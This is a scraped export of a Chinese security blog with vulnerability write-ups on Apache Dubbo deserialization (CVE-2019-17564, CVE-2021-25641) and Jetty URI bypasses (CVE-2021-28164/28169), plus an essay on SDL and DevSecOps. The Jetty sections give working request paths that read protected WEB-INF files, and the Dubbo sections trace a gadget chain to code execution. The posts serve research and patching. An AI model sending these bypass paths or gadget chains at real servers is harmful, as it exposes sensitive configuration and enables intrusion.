TransformingComparator (org.apache.commons.collections4.comparators)siftDownUsingComparator:722, PriorityQueue (java.util)siftDown:688, PriorityQueue (java.util)heapify:737, PriorityQueue (java.util)readObject:797, PriorityQueue (java.util)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invokeReadObject:1185, ObjectStreamClass (java.io)readSerialData:2234, ObjectInputStream (java.io)readOrdinaryObject:2125, ObjectInputStream (java.io)readObject0:1624, ObjectInputStream (java.io)readObject:464, ObjectInputStream (java.io)readObject:422, ObjectInputStream (java.io)doReadRemoteInvocation:144, RemoteInvocationSerializingExporter (org.springframework.remoting.rmi)readRemoteInvocation:121, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)readRemoteInvocation:100, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)handleRequest:79, HttpInvokerServiceExporter (org.springframework.remoting.httpinvoker)handle:216, HttpProtocol$InternalHandler (org.apache.dubbo.rpc.protocol.http)service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)service:790, HttpServlet (javax.servlet.http)internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)invoke:198, StandardWrapperValve (org.apache.catalina.core)invoke:96, StandardContextValve (org.apache.catalina.core)invoke:496, AuthenticatorBase (org.apache.catalina.authenticator)invoke:140, StandardHostValve (org.apache.catalina.core)invoke:81, ErrorReportValve (org.apache.catalina.valves)invoke:87, StandardEngineValve (org.apache.catalina.core)service:342, CoyoteAdapter (org.apache.catalina.connector)service:803, Http11Processor (org.apache.coyote.http11)process:66, AbstractProcessorLight (org.apache.coyote)process:790, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1468, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1149, ThreadPoolExecutor (java.util.concurrent)run:624, ThreadPoolExecutor$Worker (java.util.concurrent)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) Spring框架官方也有在文档中提到可能存在Java反序列化漏洞：https://docs.spring.io/spring-framework/docs/5.1.0.RELEASE/spring-framework-reference/integration.html#remoting-httpinvoker 0x06 补丁分析官方在后续版本中是将Spring框架的org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter类替换成了com\\googlecode\\jsonrpc4j\\JsonRpcServer类进行处理。 这里换个2.7.5版本测试。由于JsonRpcServer.handle()中无法处理Java序列化数据，因此是不存在类似Spring的HttpInvokerServiceExporter类中的反序列化漏洞的： 正常报文看下，通信的数据类型变成JSON格式了： 0x07 参考Apache Dubbo反序列化漏洞（CVE-2019-17564）","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Dubbo","slug":"Dubbo","permalink":"https://www.mi1k7ea.com/tags/Dubbo/"}]},{"title":"浅析Dubbo Kryo/FST反序列化漏洞（CVE-2021-25641）","date":"2021-06-30T04:57:38.000Z","path":"2021/06/30/浅析Dubbo-KryoFST反序列化漏洞（CVE-2021-25641）/","text":"0x00 前言学习下最近爆出的Dubbo漏洞。 0x01 漏洞原理Dubbo Provider即服务提供方默认使用dubbo协议来进行RPC通信，而dubbo协议默认是使用Hessian2序列化格式进行对象传输的，但是针对Hessian2序列化格式的对象传输可能会有黑白名单设置的限制，参考：https://github.com/apache/dubbo/pull/6378 针对这种场景，攻击者可以通过更改dubbo协议的第三个flag位字节来更改为使用Kryo或FST序列化格式来进行Dubbo Provider反序列化攻击从而绕过针对Hessian2反序列化相关的限制来达到RCE。 0x02 影响版本 Dubbo 2.7.0 to 2.7.8 Dubbo 2.6.0 to 2.6.9 Dubbo all 2.5.x versions (not supported by official team any longer) 0x03 环境搭建https://github.com/apache/dubbo-spring-boot-project 下载2.7.3版本，添加Dubbo-Common依赖： 123456&lt;!-- https://mvnrepository.com/artifact/org.apache.dubbo/dubbo-common --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-common&lt;/artifactId&gt; &lt;version&gt;2.7.3&lt;/version&gt;&lt;/dependency&gt; 注意，dubbo-common必须&lt;=2.7.3版本。 0x04 漏洞复现恶意FST/Kryo序列化请求构造工具：https://github.com/Dor-Tumarkin/CVE-2021-25641-Proof-of-Concept 冲： 0x05 调试分析Kryo反序列化在DecodeableRpcInvocation类的decode()函数中，通过serializationType为8、获取到反序列化器Kryo，然后调用readUTF()函数来读取dubbo协议对应的字段信息如dubbo协议版本、服务名称、服务版本、方法名、方法参数类型等： 提取方法参数类型为类数组后，再循坏对参数进行Kryo反序列化： 从input中读取解析到type为HashMap，因此会调用Kryo的MapSerializer序列化器来读取input中的信息： 其中会将解析到的key和value都通过调用map.put()来放入HashMap对象中，这里是有两对键值对放进去了： 往下putVal()函数中会调用key即XString类的equals()函数来判断两个key值是否相等： 这其中就会调用参数类的toString()函数，这里是com/alibaba/fastjson/JSON类的toString()函数，进而调用JSONSerializer的write()函数，从而触发Fastjson Gadget： 最后，就是TemplatesImpl链的触发点了： 此时函数调用栈： 1234567891011121314151617181920212223242526272829303132333435363738394041424344getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)write:270, MapSerializer (com.alibaba.fastjson.serializer)write:44, MapSerializer (com.alibaba.fastjson.serializer)write:280, JSONSerializer (com.alibaba.fastjson.serializer)toJSONString:863, JSON (com.alibaba.fastjson)toString:857, JSON (com.alibaba.fastjson)equals:392, XString (com.sun.org.apache.xpath.internal.objects)equals:104, HotSwappableTargetSource (org.springframework.aop.target)putVal:635, HashMap (java.util)put:612, HashMap (java.util)read:162, MapSerializer (com.esotericsoftware.kryo.serializers)read:39, MapSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:813, Kryo (com.esotericsoftware.kryo)readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)processSelectedKey:682, NioEventLoop (io.netty.channel.nio)processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)run:496, NioEventLoop (io.netty.channel.nio)run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)run:74, ThreadExecutorMap$2 (io.netty.util.internal)run:30, FastThreadLocalRunnable (io.netty.util.concurrent)run:748, Thread (java.lang) FTS反序列化FTS反序列化也是类似的触发原理。 通过serializationType为9，获取到FST反序列化器进行反序列化操作： 在FST反序列化过程中，也是将反序列化后的键值对put到HashMap对象中： 往下是和Kryo一样的调用过程，即XString类的equals()函数中调用参数的toString触发Fastjson Gadget。 此时函数调用栈： 123456789101112131415161718192021222324252627282930313233343536373839404142434445getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)write:270, MapSerializer (com.alibaba.fastjson.serializer)write:44, MapSerializer (com.alibaba.fastjson.serializer)write:280, JSONSerializer (com.alibaba.fastjson.serializer)toJSONString:863, JSON (com.alibaba.fastjson)toString:857, JSON (com.alibaba.fastjson)equals:392, XString (com.sun.org.apache.xpath.internal.objects)equals:104, HotSwappableTargetSource (org.springframework.aop.target)putVal:635, HashMap (java.util)put:612, HashMap (java.util)instantiate:79, FSTMapSerializer (org.nustaq.serialization.serializers)instantiateAndReadWithSer:497, FSTObjectInput (org.nustaq.serialization)readObjectWithHeader:366, FSTObjectInput (org.nustaq.serialization)readObjectInternal:327, FSTObjectInput (org.nustaq.serialization)readObject:307, FSTObjectInput (org.nustaq.serialization)readObject:102, FstObjectInput (org.apache.dubbo.common.serialize.fst)decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec)callDecode:441, ByteToMessageDecoder (io.netty.handler.codec)channelRead:278, ByteToMessageDecoder (io.netty.handler.codec)invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel)channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel)invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel)invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel)fireChannelRead:930, DefaultChannelPipeline (io.netty.channel)read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)processSelectedKey:682, NioEventLoop (io.netty.channel.nio)processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio)processSelectedKeys:534, NioEventLoop (io.netty.channel.nio)run:496, NioEventLoop (io.netty.channel.nio)run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent)run:74, ThreadExecutorMap$2 (io.netty.util.internal)run:30, FastThreadLocalRunnable (io.netty.util.concurrent)run:748, Thread (java.lang) 0x06 补丁分析本地以2.7.9版本测试。 在高版本中已将com.esotericsoftware:kryo依赖去掉了，在使用Kryo序列化器进行反序列化获取KryoObjectInput对象时会报找不到KryoException类的错误： 添加上对应的依赖： 12345678910111213&lt;!-- https://mvnrepository.com/artifact/com.esotericsoftware/kryo --&gt; &lt;dependency&gt; &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt; &lt;artifactId&gt;kryo&lt;/artifactId&gt; &lt;version&gt;4.0.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/de.javakaffee/kryo-serializers --&gt; &lt;dependency&gt; &lt;groupId&gt;de.javakaffee&lt;/groupId&gt; &lt;artifactId&gt;kryo-serializers&lt;/artifactId&gt; &lt;version&gt;0.43&lt;/version&gt; &lt;/dependency&gt; 其实就是CVE-2020-1948的补丁过滤拦截了： 而且，自带的Fastjson版本为1.2.70，AutoType会自动拦截掉TemplatesImpl类。 0x07 参考The 0xDABB of Doom: CVE-2021-25641","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Dubbo","slug":"Dubbo","permalink":"https://www.mi1k7ea.com/tags/Dubbo/"}]},{"title":"浅析Jetty两个URI路径限制绕过漏洞（CVE-2021-28164/CVE-2021-28169）","date":"2021-06-14T13:14:38.000Z","path":"2021/06/14/浅析Jetty两个信息泄露漏洞（CVE-2021-28164-CVE-2021-28169）/","text":"0x00 前言前段时间Jetty爆出了两个CVE，Vulhub也更新了该漏洞靶场，就简单地看下吧。 0x01 Jetty URI路径限制绕过漏洞（CVE-2021-28164）漏洞原理 Jetty 9.4.37引入对RFC3986的新实现，而URL编码的.字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过%2e来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。该漏洞在9.4.39中修复。 实际测试中发现，是能同时绕过限制来下载WEB-INF和META-INF两个目录下的任意文件的（前提是存在该目录）。 影响版本 9.4.37.v20210219 9.4.38.v20210224 环境搭建参考Vulhub：https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164 漏洞复现正常访问页面如下： 尝试访问/WEB-INF/web.xml，返回404： 在Web路径前面添加URL编码的./即可权限绕过查看到web.xml的敏感信息: 1/%2e/WEB-INF/web.xml ../也是可以的： 1/noexist/%2e%2e/WEB-INF/web.xml 调试分析在运行Jetty的命令中添加IDEA中远程调试的参数然后IDEA连接即可： 1java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar start.jar 下面看下一些关键点即可。 场景一：访问/WEB-INF/web.xml在该漏洞版本中，可以看到Jetty Server在初始化HttpConnection类时，会将HTTP解析器遵从的是RFC7230_LEGACY： 往下调试，HttpURI类的parse()函数在处理URL路径时，在识别到;?#/等字符时会有一个检测URI的函数checkSegment()来对URI中是否存在..;、%2e、%2e%2e等特殊字符进行检测： 接着在Request类的setMetaData()函数是设置请求相关的方法类型、URI和请求路径信息等，其中会判断该URI是否存在上述的特殊字符，这里没有就跳过其中的代码逻辑： 设置完请求各项内容之后，往下就会调用到HTTPChannel中的action——Dispatch分发请求： 往下会看到会调用isProtectedTarget()函数检测URL路径是否为保护路径，是的话则直接将响应设置为404： 跟进isProtectedTarget()函数，这里保护目标含有/web-inf且忽略大小写和URL路径进行比较，我们访问的路径刚好匹配因此返回true： 再往后，就是返回404响应然后结束整个请求响应处理的过程了。 场景二：访问/%2e/WEB-INF/web.xml直接调试到checkSegment()函数中，识别到%2e并标记了出来： 往下，在Request类的setMetaData()函数中进入了hasAmbiguousSegment()判断为真的逻辑中，其中compliance就是RFC7230_LEGACY、其中的sections并不包含NO_AMBIGUOUS_PATH_SEGMENTS这一项，因此直接放行往下执行进行path的URL解码然后设置到PathInfo中： 由于path以/./开头，绕过了isProtectedTarget()函数的检测，从而导致继续往下正常处理请求返回内容： 往下就是chain.doFilter()调用拦截器，然后就是doGet()发送请求获取响应内容回来： OK，至此我们已经发现漏洞产生的根源所在就是Jetty遵循的RFC7230_LEGACY没有包含NO_AMBIGUOUS_PATH_SEGMENTS即RFC3986、从而并没有对识别到的%2e进行处理。 我们看到NO_AMBIGUOUS_PATH_SEGMENTS中链接的RFC3986的URL，其中就说到了会把URI路径中的.和..删除掉的操作：https://datatracker.ietf.org/doc/html/rfc3986#section-3.3 The path segments “.” and “..”, also known as dot-segments, aredefined for relative reference within the path name hierarchy. Theyare intended for use at the beginning of a relative-path reference(Section 4.2) to indicate relative position within the hierarchicaltree of names. This is similar to their role within some operatingsystems’ file directory structures to indicate the current directoryand parent directory, respectively. However, unlike in a filesystem, these dot-segments are only interpreted within the URI pathhierarchy and are removed as part of the resolution process (Section5.2). 补丁分析这里简单看下9.4.40版本的代码修复情况。 在RFC7230_LEGACY的sections中，添加了NO_AMBIGUOUS_PATH_PARAMETERS： 接着在判断存在歧义字符的为true之后的那段代码逻辑中，由于URI没有歧义参数因此没法直接进入第三个判断条件逻辑直接报错，而是继续往下执行： 接着就判断URI存在歧义字符的话就直接调用URIUtil.canonicalPath()函数进行URI规范化处理，其是专门处理.和..字符的，从而杜绝了该漏洞： 防御方法 升级到9.4.39及以上版本； 或者更新start.d/http.ini包含以下内容来启用HttpCompliance模式RFC7230_NO_AMBIGUOUS_URIS： 1jetty.http.compliance=RFC7230_NO_AMBIGUOUS_URIS 0x02 Jetty Servlets URI路径限制绕过漏洞（CVE-2021-28169）漏洞原理Jetty Servlets中的ConcatServlet、WelcomeFilter类存在多重解码问题，当应用到这两个类之一时，攻击者就可以利用双重URL编码绕过限制来访问WEB-INF目录下的敏感文件，造成敏感信息泄露。 影响版本 9.x系列 &lt;= 9.4.40 10.x系列 &lt;= 10.0.2 11.x系列 &lt;= 11.0.2 环境搭建参考Vulhub：https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28169 漏洞复现正常访问是个Example页面： 查看页面源码，其中link标签的href属性值是使用到了ConcatServlet类来优化静态文件的加载： 1&lt;link rel=\"stylesheet\" href=\"/static?/css/base.css&amp;/css/app.css\"&gt; 基于这种访问方式尝试直接访问WEB-INF下的文件是会返回404的： 1/static?/WEB-INF/web.xml 对W进行双重URL编码则成功绕过限制访问得到敏感文件： 1/static?/%2557EB-INF/web.xml 这里看到确实设置了ConcatServlet类来优化静态文件加载。 针对WelcomeFilter类的测试可以参考官网GitHub的代码：https://github.com/eclipse/jetty.project/pull/6261/commits/c704b8100a1ccc36f4bb8b80a96f3375dde8d182#diff-70d52a090f69fbcbb6fb9d0899c514474c25c4ea79263f81cbf0e87e3c103bd5 调试分析在运行Jetty的命令中添加IDEA中远程调试的参数然后IDEA连接即可： 1java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar start.jar 之前在关于CVE-2021-28164的文章中已经简单调试过Jetty的主要路由处理过程了，后面就只看本次漏洞的关键点。 直接在ConcatServlet类的doGet()函数中下断点。 访问/static?/WEB-INF/web.xml 在断点中看到，先获取请求查询内容即URI中?号之后/WEB-INF/web.xml，接着根据&amp;即做参数切分，再逐个参数进行操作（URL解码和.、..等字符处理），最后判断处理后的path值是否以/WEB-INF/或/META-INF/开头，是的话直接返回404： 可以看到，还想用/./和/../等方式已经行不通了，但是URL解码那块代码逻辑还需要继续跟进分析。 访问/static?/%2557EB-INF/web.xml 调试到调用URIUtil.decodePath()函数进行解码的地方： 调试发现只进行了一次URL解码操作： 看下关键的处理逻辑，就是逐个获取请求参数的字符，当遇到%时会对其后面两位字符进行URL解码并替换结果，但是可以看到仅仅替换了一次，这就是漏洞根源： 123456789101112131415161718192021222324252627282930313233343536373839404142434445Utf8StringBuilder builder = null;int end = offset + length;for (int i = offset; i &lt; end; i++)&#123; char c = path.charAt(i); switch (c) &#123; case '%': if (builder == null) &#123; builder = new Utf8StringBuilder(path.length()); builder.append(path, offset, i - offset); &#125; if ((i + 2) &lt; end) &#123; char u = path.charAt(i + 1); if (u == 'u') &#123; // TODO remove %u support in jetty-10 // this is wrong. This is a codepoint not a char builder.append((char)(0xffff &amp; TypeUtil.parseInt(path, i + 2, 4, 16))); i += 5; &#125; else &#123; builder.append((byte)(0xff &amp; (TypeUtil.convertHexDigit(u) * 16 + TypeUtil.convertHexDigit(path.charAt(i + 2))))); i += 2; &#125; &#125; else &#123; throw new IllegalArgumentException(\"Bad URI % encoding\"); &#125; break; case ';': ... default: if (builder != null) builder.append(c); break; &#125;&#125; 补丁分析参考官方在9.4.41版本的修复commit：https://github.com/eclipse/jetty.project/pull/6261/commits/c704b8100a1ccc36f4bb8b80a96f3375dde8d182 ConcatServlet类的修复方法就是将path替换为part，即使用原始路径字符串作为分发器就会再次进行URL解码： 防御方法升级到9.4.41, 10.0.3, 11.0.3及以上版本。 0x03 参考https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5 https://github.com/eclipse/jetty.project/security/advisories/GHSA-gwcr-j4wh-j3cq","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Jetty","slug":"Jetty","permalink":"https://www.mi1k7ea.com/tags/Jetty/"}]},{"title":"浅谈SDL与DevSecOps","date":"2021-05-16T07:02:36.000Z","path":"2021/05/16/浅谈SDL与DevSecOps/","text":"0x00 前言这里仅谈谈个人对安全研发（SDL）和安全DevOps（DevSecOps）的理解及相关思考，但由于缺乏DevSecOps实践经验因此这块无法详细畅谈。 0x01 从企业的安全建设说起任何企业都是以业务为重。当企业的业务发展受制于安全的时候，此时企业就会考虑往安全方面投入了。比如，某公司被脱裤导致用户信息泄露之后，才开始成立自己的安全部来推动安全保障业务。 在早期的一些投入安全整改的企业中，很多企业一般都是每年花钱来请乙方安全厂商来做渗透测试、安全评估扫描等等，然后看看安全报告、推动修补相应的漏洞就了事了。但是到后来发现，这样每年给钱乙方搞安全还不如自己招那么几个安全工程师成立自己的安全部来得划算。因此，“一个人的安全部”就在这样的一些背景下产生了。这样的安全部往往人不多，但是负责安全方面的工作却比较多，从渗透测试、漏洞认领复现、安全开发、与开发扯皮、应急响应、安全运维…等等，其中个人认为于企业而言性价比最高的当然就是安全开发，企业如果购买安全厂商产品的话成本是很高的，但是如果自己招几个安全工程师搞下安全开发、搞一些如WAF、漏洞扫描器、IDS和IPS等产品，这就省了很多成本，到后期安全产品成熟了、也就变成了养那么几个安全工程师或者无须有的事情了。 当然，对于大厂而言，往往都会组建人数不少的安全部甚至每个产品线都组建自己的安全部来负责自己的产品安全，侧重点在于挖洞和修洞这两块。但是到后面，随着业务的发展，版本迭代越来越迅速，软件开发模型也变换甚多。此时，企业如果还只是纯粹地做渗透测试和安全风险评估，必然无法保障如此多版本的安全性，同时由于挖出的漏洞已处于产品“定型”阶段、导致漏洞的修复成本会非常高，这时国内企业又寻求新的变更点、学习微软的SDL，即将安全前置、使产品开发的每个阶段都融入安全活动、提高产品安全性并大大降低安全问题导致的修复成本。 0x02 SDLSDL简介SDL全称Security Development Lifecycle，即安全开发生命周期，是由微软提出并应用的一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程。 SDL的核心理念就是将安全考虑集成在软件开发的每一个阶段：需求分析、设计、编码、测试和维护。从需求、设计到发布产品的每一个阶段每都增加了相应的安全活动，以减少软件中漏洞的数量并将安全缺陷降低到最小程度。 SDL、SDLC和S-SDLCSDL：Security Development Lifecycle，安全开发生命周期； SDLC：Software Development Life Cycle，软件开发生命周期； S-SDLC：Secure Software Development Life Cycle，安全软件开发生命周期，是由开源Web安全组织OWASP推出的一个项目，它跟SDL的区别是它更关注的是SDL的落地化； SDL相关人员角色微软SDL中给出如下角色定义： 评析者/顾问角色：这些角色的任务是对项目安全和隐私进行监督，有权接受或拒绝项目团队的安全和隐私计划。 安全顾问/隐私顾问。这些角色由项目团队外部的主题专家 (SME) 担任。该角色可以由组织中专门进行此类评析的独立集中小组中的合格成员担任，也可以由组织外部的专家担任。为此任务选择的人员必须担任两个子角色： 审计官。此角色必须监控软件开发过程的每个阶段，并证明每个安全要求的成功实现。审计官必须能够自主证明过程是否符合安全和隐私要求方面的要求，而不受项目团队的干扰。 专家。为顾问角色选择的人员必须在安全方面拥有可靠的相关专业知识。 顾问角色组合。如果可以确认某人具有合适的技能和经验，则安全顾问的角色可以与隐私顾问的角色合二为一。 团队负责人。团队负责人角色应由项目团队的主题专家担任。这些角色负责协商、接受和跟踪最低安全和隐私要求，并在软件开发项目过程中与顾问和决策者保持通畅的沟通渠道。 安全负责人/隐私负责人。此角色（一人或多人）不仅负责确保软件发布解决了所有安全问题，还负责协调和跟踪项目的安全问题。此角色还负责向安全顾问和项目团队的其他相关方（例如，开发和测试负责人）报告情况。 角色组合。与安全和隐私顾问角色一样，如果可以确认某人具有合适的技能和经验，则可以由一人承担负责人角色的职责。 SDL安全活动从Microsoft SDL看起，这是一组必需的安全活动，这些活动的执行顺序与其显示顺序相同，按传统软件开发生命周期 (SDLC) 的阶段分组： 如上图列出的是SDL中必须进行的安全活动。下面来看下各个阶段的安全活动。 必须的安全活动SDL执行前：安全培训在SDL执行之前，需要给研发团队进行相关的安全培训，包括但不限于以下内容。当然，个人认为对产品线研发团队的安全培训并不只是限于SDL执行之前、而是针对各个阶段都要进行。 安全设计，包括以下主题： 减小攻击面 深度防御 最小权限原则 安全默认设置 威胁建模，包括以下主题： 威胁建模概述 威胁模型的设计意义 基于威胁模型的编码约束 安全编码，包括以下主题： 缓冲区溢出（对于使用 C 和 C++ 的应用程序） 整数算法错误（对于使用 C 和 C++ 的应用程序） 跨站点脚本（对于托管代码和 Web 应用程序） SQL 注入（对于托管代码和 Web 应用程序） 弱加密安全测试，包括以下主题： 安全测试与功能测试之间的区别 风险评估 安全测试方法 隐私，包括以下主题： 隐私敏感数据的类型 隐私设计最佳实践 风险评估 隐私开发最佳实践 隐私测试最佳实践 第一阶段：要求本阶段主要包括3个SDL实践： 安全要求：“预先”考虑安全和隐私是开发安全系统过程的基础环节。为软件项目定义信任度要求的最佳时间是在初始计划阶段。尽早定义要求有助于开发团队确定关键里程碑和交付成果，并使集成安全和隐私的过程尽量不影响到计划和安排。对安全和隐私要求的分析在项目初期执行，所做工作涉及为设计在计划运行环境中运行的应用程序确定最低安全要求，并确立和部署安全漏洞/工作项跟踪系统。 质量门/Bug栏：用于确立安全和隐私质量的最低可接受级别。 安全和隐私风险评估：安全风险评估 (SRA) 和隐私风险评估 (PRA) 是必需的过程，用于确定软件中需要深入评析的功能环节。这些评估必须包括以下信息： （安全）项目的哪些部分在发布前需要威胁模型？ （安全）项目的哪些部分在发布前需要进行安全设计评析？ （安全）项目的哪些部分（如果有）需要由不属于项目团队且双方认可的小组进行渗透测试？ （安全）是否存在安全顾问认为有必要增加的测试或分析要求以缓解安全风险？ （安全）模糊测试要求的具体范围是什么？ （隐私）隐私影响评级如何？ 第二阶段：设计SDL安全设计的6个核心原则： Attack Surface Reduction（攻击面最小化） Basic Privacy（基本隐私） Least Privilege（权限最小化） Secure Defaults（默认安全） Defense in Depth（纵深防御） Threat Modeling（威胁建模） 第三阶段：实施本阶段主要包括3个SDL实践： 使用批准的工具：所有开发团队都应定义并发布获准工具及其关联安全检查的列表，如编译器/链接器选项和警告。此列表应由项目团队的安全顾问进行批准。一般而言，开发团队应尽量使用最新版本的获准工具，以利用新的安全分析功能和保护措施。 弃用不安全的函数：许多常用函数和 API 在当前威胁环境下并不安全。项目团队应分析将与软件开发项目结合使用的所有函数和 API，并禁用确定为不安全的函数和 API。确定禁用列表之后，项目团队应使用头文件（如 banned.h 和 strsafe.h）、较新的编译器或代码扫描工具来检查代码（在适当情况下还包括旧代码）中是否存在禁用函数，并使用更安全的备选函数替代这些禁用函数。 静态代码分析：项目团队应对源代码执行静态分析。源代码静态分析为安全代码评析提供了伸缩性，可以帮助确保对安全代码策略的遵守。静态代码分析本身通常不足以替代人工代码评析。安全团队和安全顾问应了解静态分析工具的优点和缺点，并准备好根据需要为静态分析工具辅以其他工具或人工评析。 第四阶段：验证本阶段主要包括3个SDL实践： 动态程序分析：为确保程序功能按照设计方式工作，有必要对软件程序进行运行时验证。此验证任务应指定一些工具，用以监控应用程序行为是否存在内存损坏、用户权限问题以及其他重要安全问题。SDL 过程使用运行时工具（如 AppVerifier）以及其他方法（如模糊测试）来实现所需级别的安全测试覆盖率。 模糊测试：模糊测试是一种专门形式的动态分析，它通过故意向应用程序引入不良格式或随机数据诱发程序故障。模糊测试策略的制定以应用程序的预期用途以及应用程序的功能和设计规范为基础。安全顾问可能要求进行额外的模糊测试或扩大模糊测试的范围和增加持续时间。 威胁模型和攻击面评审：应用程序经常会严重偏离在软件开发项目要求和设计阶段所制定的功能和设计规范。因此，在给定应用程序完成编码后重新评析其威胁模型和攻击面度量是非常重要的。此评析可确保考虑到对系统设计或实现方面所做的全部更改，并确保因这些更改而形成的所有新攻击平台得以评析和缓解。 第五阶段：发布本阶段主要包括3个SDL实践： 事件响应计划：受SD 要求约束的每个软件发布都必须包含事件响应计划。即使在发布时不包含任何已知漏洞的程序也可能面临日后新出现的威胁。事件响应计划应包括： 单独指定的可持续工程 (SE) 团队；或者，如果团队太小以至于无法拥有 SE 资源，则应制定紧急响应计划 (ERP)，在该计划中确定相应的工程、市场营销、通信和管理人员充当发生安全紧急事件时的首要联系点。 与决策机构的电话联系（7 x 24 随时可用）。 针对从组织中其他小组继承的代码的安全维护计划。 针对获得许可的第三方代码的安全维护计划，包括文件名、版本、源代码、第三方联系信息以及要更改的合同许可（如果适用）。 最终安全评审：最终安全评析 (FSR) 是在发布之前仔细检查对软件应用程序执行的所有安全活动。FSR 由安全顾问在普通开发人员以及安全和隐私团队负责人的协助下执行。FSR 不是“渗透和修补”活动，也不是用于执行以前忽略或忘记的安全活动的时机。FSR 通常要根据以前确定的质量门或 Bug 栏检查威胁模型、异常请求、工具输出和性能。 发布/存档：指派负责发布事宜的安全顾问必须证明（使用 FSR 和其他数据）项目团队已满足安全要求。此外，必须对所有相关信息和数据进行存档，以便可以对软件进行发布后维护。这些信息和数据包括所有规范、源代码、二进制文件、专用符号、威胁模型、文档、紧急响应计划、任何第三方软件的许可证和服务条款以及执行发布后维护任务所需的任何其他数据。 发布后：响应产品在发布后的安全应急响应是必须要做的。 